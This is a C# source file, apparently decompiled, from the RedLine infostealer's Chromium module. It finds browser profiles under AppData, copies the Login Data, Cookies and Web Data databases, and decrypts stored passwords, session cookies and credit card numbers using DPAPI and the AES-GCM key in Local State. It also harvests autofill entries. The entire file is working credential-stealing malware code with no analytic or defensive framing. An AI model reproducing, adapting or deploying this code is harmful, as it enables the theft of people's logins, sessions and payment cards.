using RedLine.Client.Logic.Crypto;
using RedLine.Logic.Extensions;
using RedLine.Logic.Helpers;
using RedLine.Logic.SQLite;
using RedLine.Models;
using RedLine.Models.Browsers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace RedLine.Logic.Browsers.Chromium
{
	public static class ChromiumEngine
	{
		public static List<Browser> ParseBrowsers()
		{
			List<Browser> browserProfiles = new List<Browser>();
			try
			{
				int countCompleted = 0;
				object locker = new object();
				List<string> profile = GetProfile();
				foreach (string rootPath in profile)
				{
					new Thread((ThreadStart)delegate
					{
						Browser browser = new Browser();
						try
						{
							string fullName = new FileInfo(rootPath).Directory.FullName;
							string text = rootPath.Contains(Constants.RoamingAppData) ? GetRoamingName(fullName) : GetLocalName(fullName);
							if (!string.IsNullOrEmpty(text))
							{
								text = text[0].ToString().ToUpper() + text.Remove(0, 1);
								string name = GetName(fullName);
								if (!string.IsNullOrEmpty(name))
								{
									browser.Name = text;
									browser.Profile = name;
									browser.Cookies = EnumCook(fullName).IsNull();
									browser.Credentials = GetCredentials(fullName).IsNull();
									browser.Autofills = EnumFills(fullName).IsNull();
									browser.CreditCards = EnumCC(fullName).IsNull();
								}
							}
						}
						catch
						{
						}
						lock (locker)
						{
							IList<Cookie> cookies = browser.Cookies;
							if (cookies == null || cookies.Count <= 0)
							{
								IList<LoginPair> credentials = browser.Credentials;
								if (credentials == null || credentials.Count <= 0)
								{
									IList<CreditCard> creditCards = browser.CreditCards;
									if (creditCards == null || creditCards.Count <= 0)
									{
										IList<Autofill> autofills = browser.Autofills;
										if (autofills == null || autofills.Count <= 0)
										{
											goto IL_015c;
										}
									}
								}
							}
							browserProfiles.Add(browser);
							goto IL_015c;
							IL_015c:
							int num = countCompleted;
							countCompleted = num + 1;
						}
					}).Start();
				}
				while (countCompleted != profile.Count)
				{
				}
			}
			catch
			{
			}
			return browserProfiles;
		}

		private static List<LoginPair> GetCredentials(string profilePath)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				string text = Path.Combine(profilePath, "Login Data");
				if (!File.Exists(text))
				{
					return list;
				}
				string[] array = profilePath.Split(new string[1]
				{
					"\\"
				}, StringSplitOptions.RemoveEmptyEntries);
				array = array.Take(array.Length - 1).ToArray();
				string localStatePath = Path.Combine(string.Join("\\", array), "Local State");
				SqlConnection sqlConnection = new SqlConnection(DecryptHelper.CreateTempCopy(text));
				sqlConnection.ReadTable("logins");
				for (int i = 0; i < sqlConnection.RowLength; i++)
				{
					LoginPair loginPair = new LoginPair();
					try
					{
						loginPair = ReadData(sqlConnection, i, localStatePath);
					}
					catch
					{
					}
					if (loginPair.Login.IsNotNull() && loginPair.Login != "UNKNOWN" && loginPair.Password != "UNKNOWN" && loginPair.Host != "UNKNOWN")
					{
						list.Add(loginPair);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static List<Cookie> EnumCook(string profilePath)
		{
			List<Cookie> list = new List<Cookie>();
			try
			{
				string text = Path.Combine(profilePath, "Cookies");
				if (!File.Exists(text))
				{
					return list;
				}
				string[] array = profilePath.Split(new string[1]
				{
					"\\"
				}, StringSplitOptions.RemoveEmptyEntries);
				array = array.Take(array.Length - 1).ToArray();
				string localStatePath = Path.Combine(string.Join("\\", array), "Local State");
				SqlConnection sqlConnection = new SqlConnection(DecryptHelper.CreateTempCopy(text));
				sqlConnection.ReadTable("cookies");
				for (int i = 0; i < sqlConnection.RowLength; i++)
				{
					Cookie cookie = null;
					try
					{
						cookie = new Cookie
						{
							Host = sqlConnection.ParseValue(i, "host_key").Trim(),
							Http = (sqlConnection.ParseValue(i, "httponly") == "1"),
							Path = sqlConnection.ParseValue(i, "path").Trim(),
							Secure = (sqlConnection.ParseValue(i, "secure") == "1"),
							Expires = sqlConnection.ParseValue(i, "expires_utc").Trim(),
							Name = sqlConnection.ParseValue(i, "name").Trim(),
							Value = DecryptChromium(sqlConnection.ParseValue(i, "encrypted_value"), localStatePath)
						};
					}
					catch
					{
					}
					if (cookie != null)
					{
						list.Add(cookie);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static List<Autofill> EnumFills(string profilePath)
		{
			List<Autofill> list = new List<Autofill>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				SqlConnection sqlConnection = new SqlConnection(DecryptHelper.CreateTempCopy(text));
				sqlConnection.ReadTable("autofill");
				for (int i = 0; i < sqlConnection.RowLength; i++)
				{
					Autofill autofill = null;
					try
					{
						autofill = new Autofill
						{
							Name = sqlConnection.ParseValue(i, "name").Trim(),
							Value = sqlConnection.ParseValue(i, "value").Trim()
						};
					}
					catch
					{
					}
					if (autofill != null)
					{
						list.Add(autofill);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static List<CreditCard> EnumCC(string profilePath)
		{
			List<CreditCard> list = new List<CreditCard>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				string[] array = profilePath.Split(new string[1]
				{
					"\\"
				}, StringSplitOptions.RemoveEmptyEntries);
				array = array.Take(array.Length - 1).ToArray();
				string localStatePath = Path.Combine(string.Join("\\", array), "Local State");
				SqlConnection sqlConnection = new SqlConnection(DecryptHelper.CreateTempCopy(text));
				sqlConnection.ReadTable("credit_cards");
				for (int i = 0; i < sqlConnection.RowLength; i++)
				{
					CreditCard creditCard = null;
					try
					{
						creditCard = new CreditCard
						{
							Holder = sqlConnection.ParseValue(i, "name_on_card").Trim(),
							ExpirationMonth = Convert.ToInt32(sqlConnection.ParseValue(i, "expiration_month").Trim()),
							ExpirationYear = Convert.ToInt32(sqlConnection.ParseValue(i, "expiration_year").Trim()),
							CardNumber = DecryptChromium(sqlConnection.ParseValue(i, "card_number_encrypted"), localStatePath)
						};
					}
					catch
					{
					}
					if (creditCard != null)
					{
						list.Add(creditCard);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static LoginPair ReadData(SqlConnection manager, int row, string localStatePath)
		{
			LoginPair loginPair = new LoginPair();
			try
			{
				loginPair.Host = manager.ParseValue(row, "origin_url").Trim();
				loginPair.Login = manager.ParseValue(row, "username_value").Trim();
				loginPair.Password = DecryptChromium(manager.ParseValue(row, "password_value"), localStatePath);
				return loginPair;
			}
			catch
			{
				return loginPair;
			}
			finally
			{
				loginPair.Login = (string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login);
				loginPair.Password = (string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password);
				loginPair.Host = (string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host);
			}
		}

		private static string DecryptChromium(string chiperText, string localStatePath)
		{
			string result = string.Empty;
			try
			{
				if (chiperText.StartsWith("v10"))
				{
					result = DecryptV10(localStatePath, chiperText);
					return result;
				}
				result = DecryptHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser).Trim();
				return result;
			}
			catch
			{
				return result;
			}
		}

		private static string DecryptV10(string localStatePath, string chiperText)
		{
			int num = 12;
			string text = "v10";
			string text2 = "DPAPI";
			_ = string.Empty;
			string s = File.ReadAllText(localStatePath).FromJSON()["os_crypt"]["encrypted_key"].ToString(saving: false);
			string s2 = Encoding.Default.GetString(Convert.FromBase64String(s)).Substring(text2.Length);
			byte[] key = DecryptHelper.DecryptBlob(Encoding.Default.GetBytes(s2), DataProtectionScope.CurrentUser);
			byte[] bytes = Encoding.Default.GetBytes(chiperText.Substring(text.Length, num));
			return AesGcm256.Decrypt(Encoding.Default.GetBytes(chiperText.Substring(num + text.Length)), key, bytes);
		}

		private static string GetName(string path)
		{
			try
			{
				string[] array = path.Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[array.Length - 2] == "User Data")
				{
					return array[array.Length - 1];
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		private static string GetRoamingName(string path)
		{
			try
			{
				return path.Split(new string[1]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries)[0];
			}
			catch
			{
			}
			return string.Empty;
		}

		private static string GetLocalName(string path)
		{
			try
			{
				string[] array = path.Split(new string[1]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[0] + "_[" + array[1] + "]";
			}
			catch
			{
			}
			return string.Empty;
		}

		private static List<string> GetProfile()
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(DecryptHelper.FindPaths(Constants.RoamingAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
				list.AddRange(DecryptHelper.FindPaths(Constants.LocalAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
				return list;
			}
			catch
			{
				return list;
			}
		}
	}
}
